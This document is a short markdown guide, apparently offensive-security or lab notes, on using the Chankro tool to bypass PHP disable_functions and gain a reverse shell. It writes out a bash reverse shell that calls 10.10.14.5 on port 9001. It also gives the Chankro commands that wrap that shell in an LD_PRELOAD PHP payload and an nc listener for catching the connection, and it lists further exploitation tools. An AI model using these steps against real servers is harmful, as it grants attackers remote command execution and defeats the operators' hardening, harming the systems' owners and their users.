# ğŸ˜ Bypassing `disable_functions` in PHP for Reverse Shell Using Chankro

Sometimes `system`, `exec`, `shell_exec`, and other dangerous PHP functions are disabled. `Chankro` helps us bypass these by using `LD_PRELOAD` and custom shared objects.

---

## ğŸ§  Step-by-Step Guide

### ğŸ” 1. Identify Target Architecture

- Access the `phpinfo.php` page on the target.
- Look for architecture info:
  - `Architecture => x86_64` â†’ 64-bit
  - `Architecture => i686` or `i386` â†’ 32-bit

---

### ğŸ’£ 2. Create Shell Script

Prepare a Bash reverse shell in a file named `shell`:

```bash
echo "bash -c 'exec bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'" > shell
````

---

### âš™ï¸ 3. Install Chankro

If not installed:

```bash
git clone https://github.com/TarlogicSecurity/Chankro.git
cd Chankro
python2 chankro.py --help
```

---

### ğŸ› ï¸ 4. Generate PHP Payload with Chankro

Use this command template:

```bash
python2 chankro.py --arch ARCH --input shell --output payload.php --path /var/www/html/<app_folder>
```

Replace:

* `ARCH` â†’ `32` or `64` based on step 1
* `shell` â†’ the file with your payload
* `payload.php` â†’ the final payload name
* `path` â†’ the full path from `DOCUMENT_ROOT` (found in `phpinfo()`)

#### âœ… Example

```bash
python2 chankro.py --arch 64 --input shell --output rev.php --path /var/www/html/fa5fba5f5a39d27d8bb7fe5f518e00db
```

---

## ğŸ–¥ï¸ Start Listener on Attacker Machine

```bash
nc -lvnp 9001
```

---

## ğŸ§ª Additional Notes

* `Chankro` works by abusing `LD_PRELOAD` trick when PHP is running in mod\_php.
* Works well when `disable_functions`, `open_basedir`, and other hardening techniques are in place.
* Does not work in environments using PHP-FPM with separate privilege drops.

---

## ğŸ”„ Related Tools

* **PHPGGC** â€“ For deserialization-based shell payloads.
* **socat** â€“ For more stable reverse shells.
* **LinPEAS** â€“ To identify misconfigurations for further exploitation.
* **php-reverse-shell.php** â€“ Basic reverse shell (fallback when `system()` is enabled).
